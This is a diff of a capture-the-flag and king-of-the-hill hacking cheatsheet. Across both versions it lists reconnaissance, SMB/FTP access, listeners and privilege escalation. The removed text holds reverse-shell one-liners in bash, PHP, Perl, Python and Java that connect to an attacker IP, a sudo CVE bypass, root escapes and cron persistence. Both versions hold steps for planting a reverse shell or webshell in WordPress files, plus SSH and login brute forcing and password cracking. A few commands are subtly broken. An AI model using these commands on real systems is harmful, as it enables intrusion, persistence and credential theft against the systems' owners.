@@ -1,581 +1,557 @@
-<h1>PFORM - CTF / KOTH - Cheatsheet</h1><br><br>
+<!--
+TODO:
+    add sqli stuff
+    add lfi and rfi
+    add stegno stuff
+-->
+# PFORM - CTF / KOTH - Cheatsheet<br>
+### ToC - Table of Contents
+- [RESOURCES](#resource)
+- [RECON](#recon)
+- [SMB](#smb)
+    - [Mount SMB share](#smbShareMount)
+    - [Map SMB shares](#mapSmbShares)
+- [FTP](#ftp)
+    - [FTP cheat sheet](#ftpCht)
+- [RDP (Remote Desktop Protocol)](#rdp)
+- [Listners](#listners)
+- Reverse Shells
+    - [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+    - [Payload All Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+    - [RevShells.com (0day's Site)](https://www.revshells.com/)
+- [Privilege escalation](#privEsc)
+    - [Tools](#privEscTools)
+    - [Site's to find Exploit!](#privEscSites)
+    - [LinPeas](#linpeas)
+    - [SUID Command's](#suidCmds)
+- [Spawn TTY shell](#spawnTTY)
+- [BruteForce](#bfs)
+    - [Wordpress Login](#wps)
+    - [SSH brute force](#sshbfs)
+    - [URL get paraneter](#get)
+- [Password Cracking](#passCrack)
+    - [ZIP File](#zip)
+    - [PGP](#pgp)
+    - [SSH key](#sshkey)
+- [WordPress Reverse Shell](#wpsr3v)
+- [Transfer files](#tcf)
+    - [HTTP](#http)
+    - [SCP](#scp)
+    - [NetCat](#nc)
+- [King.txt](#king)
+- [Random tips and triks](#tips)
+    - [Change shells ip address in rush](#changeIp)
+    - [Talk with other player in machine](#talk)
 
-<br><h2>RECON</h2> 
+**For Copy/Paste commands export ip address as IP:**
+```shell
+export IP="10.10.10.10"
+```
 
-<b>pform@attacker~: </b><code>rustscan -A 10.10.20.20</code>
+<h2 id="resource">RESOURCES</h2>
 
-<b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log 10.10.20.20</code>
+- [Google!](http://www.google.com)
+- [CyberChef](https://gchq.github.io/CyberChef/)
+- [CrackStation](https://crackstation.net/)
+- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [SQLI Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
+- [GTFOBins](https://gtfobins.github.io/)
+- [CTF Katana](https://github.com/JohnHammond/ctf-katana)
+- [Magic Hashes](https://github.com/spaze/hashes)
+- [RevShells (0day's Site)](https://www.revshells.com/)
+- [Pentest Monkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [CVE Search](https://www.cve-search.org/)
+- [Exploit DB](https://www.exploit-db.com/search)
+- [1337Day](http://1337day.com)
+- [ExploitSearch](http://www.exploitsearch.net)
 
-<b>pform@attacker~: </b><code>lin4enum 10.10.20.20</code>
+<h2 id="recon">RECON</h2>
 
-<b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://10.10.20.20 -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>
+[**RustScan:**](https://github.com/RustScan/RustScan)
+```
+rustscan -A $IP`
+```
 
-<b>pform@attacker~: </b><code>wfuzz -w /usr/share/wordlists/directory-list-2.3-medium.txt -c --hc 404 http://10.10.20.20/FUZZ</code>
+[**Nmap:**](https://nmap.org/)</br>
+**1.**
+- No ping
+- Version detection
+- Default scripts
+- save output
 
-<b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 10.10.20.20</code>
+```shell
+nmap -Pn -sV -sC -oN nmap.log $IP
+```
+
+**2.**
+- all ports
+```shell
+nmap -p- $IP
+```
+
+[**Enum4linux:**](https://www.kali.org/tools/enum4linux/)
+```
+enum4linux $IP`
+```
+
+[**Gobuster:**](https://github.com/OJ/gobuster)
+```
+gobuster dir -e php,html,htm,txt,log,conf,flag -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
+```
+
+[**Wfuzz:**](https://github.com/xmendez/wfuzz)
+- directory discovery with Wfuzz
+```shell
+wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c --hc 404 http://$IP/FUZZ
+```
+
+[**Nikto:**](https://github.com/sullo/nikto)
+```shell
+nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host $IP
+```
 
 
-<h2>SMB</h2>
+<h2 id="smb">SMB</h2>
 
-<b>pform@attacker~: </b><code>sudo nmap --script smb-enum-shares.nse -p445 10.10.20.20</code>
+[**Nmap:**](https://nmap.org/)</br>
+**1.**
+- SMB scripts
+```shell
+sudo nmap --script smb-enum-shares.nse -p 445 $IP
+```
 
-<b>pform@attacker~: </b><code>sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.10.20.20</code>
+**2.**
+- smb scripts
+- UDP
+- TCP Syn scan
+```shell
+sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 $IP
+```
 
-<b>pform@attacker~: </b><code>smbmap -H 10.10.20.20</code>
+[**SmbMap:**](https://github.com/ShawnDEvans/smbmap)
+```shell
+smbmap -H $IP
+```
 
-<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.20.20</code>
+[**smbClient:**](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
+```shell
+smbclient -L \\$IP
+```
+```shell
+smbclient -L \\$IP\C$ -U guest -W WORKGROUP
+```
+**Download:** `get`</br>
+**Upload:** `put`
 
-<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.20.20\\C$ -U guest -W WORKGROUP</code>
+<b><h3 id="smbShareMount">Mount SMB share</h3></b>
 
-<b>Download :</b> <code>get</code>
+```shell
+smbmount "\\$IP\super-secret-folder" -U hacked-account -c 'mount /mnt/super-secret-folder/ -u 500 -g 100'
+```
 
-<b>Upload :</b> <code>put</code>
+<b><h3 id="mapSmbShares">Map out smb shares</h3></b>
 
-<br>
-<h2>Mount smb share</h2>
+[**SmbMap:**](https://github.com/ShawnDEvans/smbmap)
+```shell
+smbmap -H $IP
+```
+```
+smbmap -u hacked-account -p supersecretpassword123 -d workgroup -H $IP
+```
 
-<b>pform@attacker~: </b><code>smbmount "\\\\10.10.20.20\\super-secret-folder" -U hacked-account -c 'mount /mnt/super-secret-folder/ -u 500 -g 100'</code>
+<h2 id="ftp">FTP</h2>
 
-<h2>Map out smb shares</h2>
+**Is the host vuln to anonymous login?**
+> Anonymous ftp logins are usually the username 'anonymous' with the user's email address as the password.
+>
+> NOTE: some time password can be 'anonymous'.
 
-<b>pform@attacker~: </b><code>smbmap -H 10.10.20.20</code>
-<b>pform@attacker~: </b><code>smbmap -u hacked-account -p supersecretpassword123 -d workgroup -H 10.10.20.20</code>
+```shell
+ftp $IP
+```
 
-
-
-<h2>FTP</h2>
-
-Is the host vuln to anonymous login?
-
-<b>pform@attacker~: </b><code>ftp 10.10.20.20</code>
-
-<b>pform@attacker~: </b>Login: <code>anonymous</code> Password: <code>anonymous</code>
+Username: `anonymous` </br>
+Password: `anonymous`
 
 Dont forget to check for hidden directories like this:
 
-<b>pform@attacker~: </b><code>ls -la</code>
-
+```
 drwxr-xr-x pform pform 0069 Dec 32 00:00 .
-
 drwxr-xr-x pform pform 0069 Dec 32 20:00 ..
-
-drwxr-xr-x pform pform 0069 Dec 32 00:00 ... <b>     < - - - - - - - - - - - - ( 3 dots )</b>
-
+drwxr-xr-x pform pform 0069 Dec 32 00:00 ... <--- ( 3 dots )
+drwxr-xr-x pform pform 0069 Dec 32 00:00 .myHiddenDir
 -rw-r--r-x pform pform 0069 Dec 32 00:00 random-stuff.txt
+```
 
-<b>Download :</b> get, or mget * (to download all files in folder)
+<h3 id="ftpCht">FTP cheat sheet</h3>
 
-<b>Upload :</b> <code>put</code>
+**Download:** `get` or `mget *` to download all files in folder
 
-<b>Upload :</b> <code>mget *</code> (Download all files in the folder)
+**Upload:** `put`
 
-<b>Read files :</b> <code>more</code>
+**Read files:** `more`
 
 
 
-<h2>RDP</h2>
+<h2 id="rdp">RDP</h2>
 
-I think remmina is slow, compared to xfreerdp. 
+> **+clipboard** makes it possible to copy from **attacker machine** to **victim machine**
 
-<b>+clipboard</b> makes it possible to copy from <b>attacker machine</b> to <b>victim machine</b>
-
-<b>pform@attacker~: </b><code>xfreerdp +clipboard +window-drag /u:username /p:password /v:10.10.10.10</code>
+```shell
+xfreerdp +clipboard +window-drag /u:username /p:password /v:$IP
+```
 
 <h2>SSH</h2>
 
-<b>pform@attacker~: </b><code>ssh user@10.10.20.20 -p 22</code>
+> you can specify port with `-p` if it was diffrent!
 
-<b>pform@attacker~: </b><code>ssh -i id_rsa user@10.10.20.20 -p 22</code>
+```
+ssh user@$IP
+```
 
+**Login with id_rsa file:**
 
-<h1>Listners</1>
+> `id_rsa` file is usualy on the `~/.ssh/id_rsa`
+```
+ssh -i id_rsa user@10.10.20.20
+```
 
-<h2>NETCAT</h2>
 
+<h2 id="listners">Listners</h2>
 
-<b>pform@attacker~: </b><code>nc -lnvp 5555</code>
+### NetCat
 
-<h2>PWNCAT</h2>
+```shell
+nc -lnvp 1337
+```
 
+### [PwnCat](https://github.com/calebstewart/pwncat)
 
-For more mer info on pwncat visit: <li>https://github.com/calebstewart/pwncat</li>
+If you are in **Arch based** distrobution you can find pwncan in repo as `pwncat-caleb`
 
-<code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>
+```shell
+git clone https://github.com/calebstewart/pwncat.git && cd pwncat; python setup.py install
+```
 
-<code>pwncat -l -p 5555</code>
+```shell
+pwncat -l -p 1337
+```
 
+Download and Upload:
+```
+(victem) >>> pwd
+/home/victem/
 
-I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
+# CTRL + D
 
-<b>hacked-account@victim ~/</b><code></code>
+(Attacker) >>> download /home/victem/image.jpg
+(Attacker) >>> upload ./1337H4x0r_PrivEsc_Tool
 
-Press<b>"CTRL+D"</b>
+# CTRL + D
 
-<b>pform@local~: </b><code>download /etc/passwd</code>
+(victem) >>> ls
 
-<b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py</code>
+img.jpg
+1337H4x0r_PrivEsc_Tool
+```
 
-Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
+<h2 id="privEsc">Privesc</h2>
 
-<b>hacked-account@victim ~/</b><code></code>
+<h3 id="privEscTools">TOOLS</h3>
 
+- [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/PEASS-ng)
+- [PentestMonkey unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)
+- [LES: linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
+- [LinEnum](https://github.com/rebootuser/LinEnum)
 
-<h1>Reverse-Shell</h1>
+<h3 id="privEscSites">Sites to find Exploit!</h3>
 
-Pentestmonkey <li>http://pentestmonkey.net/</li>
+- [CVE Search](https://www.cve-search.org/)
+- [ExploitDB](http://www.exploit-db.com)
+- [1337Day](http://1337day.com)
+- [ExploitSearch](http://www.exploitsearch.net)
+- [Metasploit Modules](http://metasploit.com/modules/)
+- [Google!](http://www.google.com)
 
-<h2>Bash</h2>
+<h3 id="linpeas">LinPeas<h3>
 
-Use this if you have direct access to console commands like whoami.
+| Method    | Command                                                                                  |
+|:----------|:-----------------------------------------------------------------------------------------|
+| **curl**  | `sh -c "$(curl -fsSL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)"` |
+| **wget**  | `sh -c "$(wget -O- https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)"`   |
+| **fetch** | `sh -c "$(fetch -o - https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)"` |
 
-<code>/bin/bash -i >& /dev/tcp/10.10.10.10/5555</code>
 
-You have to do it like this if you run it in on a wordpress site
+<h3 id="suidCmds">SUID Commands:</h3>
 
-<code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
+```
+find / -user root -perm /4000 2>/dev/null
 
+find / -perm -u=s -type f 2>/dev/null
 
-<h2>PHP</h2>
+find / -type f -name '*.txt' 2>/dev/null
 
+find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
 
-<code>php -r '$sock=fsockopen("10.10.10.10",5555);exec("/bin/sh -i <&3 >&3 2>&3");'</code>
+getcap -r / 2>/dev/null
+```
 
-<h2>Perl</h2>
+after you find SUID file you can use [GTFOBins](https://gtfobins.github.io/) to find ways to Privesc with that binary!
 
 
-<code>perl -e 'use Socket;$i="10.10.10.10";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code>
-  
-<h2>Python</h2>
+<h2 id="spawnTTY">Spawn TTY shell / Stablelize your Shell</h2>
 
+Best Way:
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# OR
+python -c 'import pty; pty.spawn("/bin/bash")'
 
-<code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code>
+export TERM=xterm
 
-<h2>mkfifo</h2>
+# Ctrl + Z
 
+stty raw -echo; fg
 
-<code>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s</code>
+# ENTER
+```
 
-<h2>Java</h2>
+sh
+```
+/bin/sh -i
+```
 
+Parel
+```
+perl —e 'exec "/bin/sh";'
+```
 
-<code>r = Runtime.getRuntime()</code>
+VI
+```
+:!bash
+```
 
-<code>p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])</code>
+VI2
+```
+:set shell=/bin/bash:shell
+```
+<h2 id="bfs">Brute Force</h2>
 
-<code>p.waitFor()</code>
+<b><h3 id="wps">WordPress Login</h3></b>
 
-This java reverse-shell works in Jenkins script console.
+[**WpScan:**](https://wpscan.com/)
+```
+wpscan --url http://$IP -U admin -P /opt/wordlists/rockyou.txt -t 20
+```
 
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+```
 
 
-<h1>Privesc</h1>
+<b><h3 id="sshbfs">SSH</h3></b>
 
-<h2>Search programs to privesc</h2>
+[**Hydra:**](https://github.com/vanhauser-thc/thc-hydra)
+```
+hydra -l username -P /user/share/wordlists/rockyou.txt ssh://$IP -p 22
+```
+```
+hydra -v -V -u -L username -P /usr/share/rockyou.txt -t 1 -u $ip ssh
+```
 
-<b>hacked-account@victim~: </b><b><code>sudo -l</b></code> lists all commands your USER can use with SUDO permissions.
+<b><h3 id="get">URL GET parameters brute force</h3></b>
 
-If user dont have premisions try:
+```
+ffuf -w /usr/share/rockyou.txt -u https://$IP/admin.php?username=admin&password=FUZZ -fc 100
+```
+ffuf filter:
+```
+-fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
+-fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
+-fr                 Filter regexp
+-fs                 Filter HTTP response size. Comma separated list of sizes and ranges
+-ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100
+```
 
-Linpeas <li>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</li>
 
-LinEnum <li>https://github.com/rebootuser/LinEnum</li>
+<h2 id="passCrack">Password Cracking</h2>
 
-<b>hacked-account@victim~: </b><code>find / -perm -u=s -type f 2>/dev/null</code>
+<b><h3 id="zip">ZIP</h3></b>
 
-<b>hacked-account@victim~: </b><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code>
+```
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt myzipfile.zip
+```
 
+**Or:**
 
 
-<h1>GTFObins</h1>
+```
+zip2john myzipfile.zip > ziphash.txt
 
+john --format=PKZIP ziphash.txt
 
-Heres a lists of a few programs that can be used to privesc, for more check the link below.
+john --wordlist /opt/wordlists/rockyou.txt ziphash.txt
+```
 
-<li>https://gtfobins.github.io/</li>
+<b><h3 id="pgp">PGP-Key</h3></b>
 
-<h2>sudo - CVE-2019-14287</h2>
+```
+gpg2john wordlist > wordlisthash-from-file</code>
 
-Read more: <li>https://hackersploit.org/sudo-security-bypass-vulnerability-cve-2019-14287/</li>
-  
-Requirments: : sudo version <= 1.8.28
+john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt  wordlisthash-from-file
+```
 
-<b>hacked-account@victim:~: </b><code>sudo -u#-1 /usr/bin/vi /home/hacked-account/user.txt</code> followed by shift+: <code>!/bin/bash</code>
+Crack sha512 (deafult unix root hash)
+```
+hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /usr/share/wordlists/rockyou.txt
+```
 
-<h2>bash</h2>
+<b><h3 id="sshkey">SSH key</h3></b>
 
-<b>hacked-account@victim~: </b><code>sudo -u#-1 /bin/bash</code>
+```
+ssh2john id_rsa_file >> extracted_hash
 
-<b>hacked-account@victim~: </b><code>sudo bash -p</code>
+john extracted_hash --wordlist=/opt/wordlists/rockyou.txt
+```
+> Don´t foreget to chmod 600 on the id_rsa file
 
-<h2>vim</h2>
+#### Identify your Hash
 
-<b>hacked-account@victim~: </b><code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
+**1.**
 
-<h2>nmap</h2>
+run `hash-identifier` then put your hash
 
-<b>hacked-account@victim~: </b><code>sudo nmap --interactive</code> followed by <code>!bash</code>
+**2.**
+```
+john hash-file.txt
+```
 
-<h2>git</h2>
 
-<b>hacked-account@victim:~: </b><code> sudo git -p help config</code> followed by <b>shift+:</b> and Command> <code>/bin/bash</code>
+<h2 id="wpsr3v">Get Reverse-Shell in Wordpress</h2>
 
-<h2>iftop</h2>
+**1.**
+Download PentestMonkey PHP reverse shell from [HERE](https://github.com/pentestmonkey/php-reverse-shell)
 
-<b>hacked-account@victim:~: </b><code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/bash</code>
+Or:
 
-<h2>find</h2>
+```
+wget "https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" > shell.php
+```
 
-<b>hacked-account@victim~: </b><code>sudo find . -exec /bin/bash \; -quit</code>
+Edit file and change ip and port:
+```php
+$ip = 'put your ip here';  // CHANGE THIS
+$port = 1337;       // CHANGE THIS
+```
 
-<b>hacked-account@victim~: </b><code>sudo find /var/log -name messages -exec /bin/bash -i \;</code>
+**2.**
+Create new page or edit index.php
 
-<h2>nano</h2>
+to edit pages go to:
+> Appearance > Theme Editor
 
-<b>hacked-account@victim~: </b><code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file
+<h2 id="tcf">Transfer files</h2>
 
-<h2>man</h2>
 
-<b>hacked-account@victim~: </b><code>sudo man man </code>followed by <code>!/bin/bash</code>
+<h3 id="http">Http Server</h3>
+Run http server in your own machine:
 
-<h2>awk</h2>
+```
+python -m SimpleHTTPServer 1337
 
-<b>hacked-account@victim~: </b><code>sudo awk 'BEGIN {system("/bin/bash")}'</code>
+python3 -m http.server 1337
+```
+For sake of being lazy you can put:
+```
+alias up="python3 -m http.server 1337"
+```
+in your `bashrc` or `zshrc`!
 
-<h2>less</h2>
+then in the victem machine use:
 
-<b>hacked-account@victim~: </b><code>sudo less /etc/profile followed by !/bin/bash</code>
+```
+export IP="Your IP"
+# Wget
+wget $IP/myFile.sh > myFile.sh
 
-<b>hacked-account@victim~: </b><code>sudo less /var/log/messages followed by !/bin/bash</code>
+# curl
+curl $IP/myFile.sh > myFile.sh
+```
 
-<b>hacked-account@victim~: </b><code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the program persist the root permision)
+<h3 id="scp">SCP</h3>
 
+```
+scp - id_rsa ~/scripts/superprivesc0day.sh hacked-account@10.10.20.20/home/hacked-account/.hidden/privesc.sh
+```
 
-<h2>ftp</h2>
-
-<b>hacked-account@victim~: </b><code>sudo ftp</code>followed by <code>!/bin/sh</code>
-
-<h2>more</h2>
-
-<b>hacked-account@victim~: </b><code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
-
-<h2>zip</h2>
-
-<b>hacked-account@victim~: </b><code>touch my-bum.txt</code>
-
-<b>hacked-account@victim~: </b><code>sudo zip my-bum.zip my-bum.txt -T --unzip-command="sh -c /bin/bash"</code>
-
-<h2>nc</h2>
-
-If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
-
-Run 
-
-<b>pform@attacker~: </b><code>nc -l -p 5555</code> on the attacker box to receive the shell. This only works with netcat traditional.
-
-<b>hacked-account@victim~: </b><code>RHOST=10.10.10.10</code>
-
-<b>hacked-account@victim~: </b><code>RPORT=5555</code>
-
-<b>hacked-account@victim~: </b><code>sudo nc -e /bin/sh $RHOST $RPORT</code>
-
-
-<h2>Crontab</h2>
-
-Check if you can view crontab :
-
-<b>hacked-account@victim~: </b><code>cat /etc/crontab</code>
-
-Do you see a script that is running that your user have premision to edit? If you do, replace the content with a bash reverse-shell:
-
-
-<code>#!/bin/bash</code>
-
-<code>bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
-
-First start listner
-
-<b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
- 
-Then you have to wait for the time as the script it setup to run at.
-
-If you dont know how the time for crontab works, use the link below to find out.
-
-<li>https://crontab.guru/</li>
-
-
-
-<h1>Spawn TTY shell / Stablelize your Shell</h1>
-
-
-<b>hacked-account@victim~: </b><code>python -c 'import pty; pty.spawn("/bin/sh")'</code>
-
-<b>hacked-account@victim~: </b><code>echo os.system('/bin/bash')</code>
-
-<b>hacked-account@victim~: </b><code>/bin/sh -i</code>
-
-<b>hacked-account@victim~: </b><code>perl —e 'exec "/bin/sh";'</code>
-
-<b>hacked-account@victim~: </b><code>perl: exec "/bin/sh";</code>
-
-<b>hacked-account@victim~: </b><code>ruby: exec "/bin/sh"</code>
-
-<b>hacked-account@victim~: </b><code>lua: os.execute('/bin/sh')</code>
-
-
-<b>From rbash to bash</b> 
-
-<b>hacked-account@victim~: </b><code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
-
-
-<b>From crontab to bash</b>
-
-example 1.
-
-First start listner
-<b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
-
-<b>hacked-account@victim ~/ </b><code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>
-
-Then you just have to look and wait in your lister terminal for 1 min.
-
-
-<br><h1>Brute Force Logins</h1>
-
-<br><b>Brute Force Wordpress Login with WPScan</b>
-
-<b>pform@attacker~: </b><code>wpscan --url http://10.10.20.20/blog -U admin -P /opt/wordlists/rockyou.txt -t 20</code>
-
-<b>Brute Force with Hydra</b>
-
-<b>example - Jenkins</b>
-
-<b>In this example we are passing the traffic over a SSH Tunnel on port : 4444
-  
-<b>pform@attacker~: </b><code>hydra -l admin -P /opt/wordlists/rockyou.txt 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError' -I -s 4444</code>
-
-<b>example - SSH</b>
-
-<b>pform@attacker~: </b><code>hydra -l admin -P /opt/wordlists/rockyou.txt ssh://10.10.20.20 -p 22</code>
-
-<br><br><h1>Password Cracking</h1>
-
-<b>ZIP</b>
-
-<b>pform@attacker~: </b><code>fcrackzip -u -D -p /opt/wordlists/rockyou.txt zipfile-with-password.zip</code>
-
-<b>or</b>
-
-<b>pform@attacker~: </b><code>zip2john zip.zip > ziphash.txt</code>
-
-<b>pform@attacker~: </b><code>john --format=PKZIP ziphash.txt</code>
-
-<b>pform@attacker~: </b><code>john --wordlist /opt/wordlists/rockyou.txt ziphash.txt</code>
-
-<b>PGP-Key</b>
-
-Extract crackable hash
-
-<b>pform@attacker~: </b><code>gpg2john wordlist > wordlisthash-from-file</code>
-
-Crack Hash
-
-<b>pform@attacker~: </b><code>john --format=gpg --wordlist=/opt/wordlists/rockyou.txt  wordlisthash-from-file</code>
-
-<br><b>Crack sha512 (deafult unix root hash)</b>
-
-<b>pform@attacker~: </b><code>hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /opt/wordlists/rockyou.txt</code>
-
-<b>Crack SSH-Key</b>
-
-
-<b>pform@attacker~: </b><code>ssh2john id_rsa_file >> extracted_hash</code>
-
-<b>pform@attacker~: </b><code>john extracted_hash --wordlist=/opt/wordlists/rockyou.txt</code>
-
-OBS! - Don´t foreget to chmod 600 on the id_rsa file
-
-
-
-<b>Identify your hash</b>
-
-example 1.
-
-<b>pform@attacker~: </b><code>hash-identifier</code>
-
-<b>PAST in you hash</b>
-
-example 2.
-
-<b>pform@attacker~: </b><code>john hash-file.txt</code>
-
-
-<h1>Get Reverse-Shell in Wordpress</h1>
-
-
-<h2>Wordpress example 1. - Using 404.php</h2>
-
-
-The best thing is to edit the 404.php file for the theme in use or another theme thats not in use, to be more stealth, 
-
-as it dont hang the hole wordpress site, if you need to check the site for more information.
-
-<b>First you need so set up your listner:</b>
-
-<b>pform@attacker~: </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
-
-Then to load the reverse-shell just visit: http://10.10.20.20/wordpress/wp-content/themes/twentytwenty/404.php
-
-
-<h2>Wordpress example 2. - Using index.php</h2>
-
-
-First you need so set up your listner:
-
-<b>pform@attacker~: </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
-
-Edit the theme´s index.php file.
-
-Between :
-
-get_header(); ?>
-
-<code>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s</code>
-
-<div class="wrap">
-  
-<h2>Wordpress example 3. - Using Plugin Editor</h2>
- 
-
-After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.
-
-Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
-
-<h2>Wordpress example 4. - Using header.php</h2>
-  
-
-Edit "header.php"
-
-Under php tag
-
-<code>echo system($ REQUESTS['cmd']);</code>
-
-change request metod by left click
-
-open upp burp and run command in the bottom of the page:
-
-<code>cmd=whomai</code>
-
-<code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
-
-
-<h1>Random Tips and Tricks</h1>
-
-
-<h2>SSH Tunneling</h2>
-
-Tunnel traffic over ssh to your attacker machine so you can act as the machine you have ssh in to.
-
-Example.
-
-The victim box have access to a Jenkins server running on ip 172.17.0.2 port:8080.
-
-<b>pform@attacker~: </b><code>ssh -L 4444:172.17.0.2:8080 hacked-account@10.10.20.20</code>
-
-Now you just open your webbrowser and surf to: <code>http://localhost:4444/</code>
-
-And you can access the server running Jenkins as it was on your localnetwork.
-
-<br>
-
-<h2>Change IP on all scripts in a folder</h2>
-
-
-If you like me have a folders with reverse-shells and scripts for your CTF / Koth needs,
-
-and your IP changes just before the game starts, and no script have the correct ip.
-
-<b>pform@attacker~: </b><code>cd ~/super-ninja-scripts/</code>
-
-<b>pform@attacker~script-folder/:<code>grep -rl 10.10.10.10 * | xargs sed -i 's/10.10.10.10/20.20.20.20/g'</code>
-
-<b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>
-
-
-<h2>Portscan with BASH</h2>
-
-
-<b>(Use bash to portscan new host thats only accesible from victim machine, with no other portscanner in reach.)</b>
-
-<b>Open ports gives you back a "Done"</b>
-
-<b>Closed ports give you back a "Connection refused"</b>
-
-<b>hacked-account@victim ~/: <b/><code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
-
-<h2>Portscan with CURL</h2>
-
-<b>hacked-account@victim ~/: <b/><code>curl http://10.10.20.20:[1-6000]</code>
-
-<h1>Transfer files</h1>
-
-
-<h2>WGET</h2>
-
-
-Run this in the folder you have the files you want to upload.
-
-<b>pform@attacker~: </b><code>python -m SimpleHTTPServer 5555</code>
-
-<b>pform@attacker~: </b><code>python3 -m http.server 5555</code>
-
-The use wget to download the file like this:
-
-<b>hacked-account@victim~: </b><code>wget 10.10.10.10:5555/super-privesc-0day.sh</code>
-
-<h2>CURL</h2>
-
-
-Run this in the folder you have the files you want to upload.
-
-<b>pform@attacker~: </b><code>python -m SimpleHTTPServer 5555</code>
-
-<b>pform@attacker~: </b><code>python3 -m http.server 5555</code>
-
-The use curl to download the file like this:
-
-<b>hacked-account@victim~: </b><code>curl 10.10.10.10:5555/super-privesc-0day.sh -o .hidden-file.sh</code>
-
-<h2>SCP</h2>
-
-<b>pform@attacker~: </b><code>scp - id_rsa ~/scripts/superprivesc0day.sh hacked-account@10.10.20.20/home/hacked-account/.hidden/privesc.sh</code>
-
-<h2>With NETCAT</h2>
-
+<h3 id="nc">NetCat</h3>
 
 On receiving end:
 
-<b>pform@attacker~: </b><code>nc -l 5555 > linpeas.sh</code>
+```
+nc -l 1337 > linpeas.sh
+```
 
 On sending end:
 
-<b>hacked-account@victim~: </b>nc -w 3 10.10.10.10 5555 < linpeas.sh</code>
+```
+nc -w 3 $IP 1337 < linpeas.sh
+```
 
 If you want to transfer from attacker to victim, just swich the commands.
 
